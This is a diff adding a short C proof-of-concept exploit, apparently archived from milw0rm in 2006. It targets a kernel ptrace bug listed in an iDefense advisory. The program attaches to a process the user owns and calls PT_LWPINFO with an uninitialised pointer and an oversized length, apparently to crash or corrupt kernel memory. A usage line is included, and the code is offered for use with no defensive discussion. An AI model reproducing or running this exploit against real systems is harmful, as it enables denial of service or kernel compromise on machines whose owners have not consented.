@@ -1,0 +1,14 @@
+#include <sys/types.h>
+#include <sys/ptrace.h>
+#include <unistd.h>
+/* lol lol, exploit for http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=419
+thank you oh unknown, sincerely kokanin@gmail. usage: ./blah <pid you own> */
+
+int main(int argc, char *argv[]){
+	struct ptrace_lwpinfo *lol;
+	ptrace(PT_ATTACH,atoi(argv[1]),NULL,0);
+	wait(NULL);
+	ptrace(PT_LWPINFO,atoi(argv[1]),(void *)&lol,32768);
+}
+
+// milw0rm.com [2006-10-12]
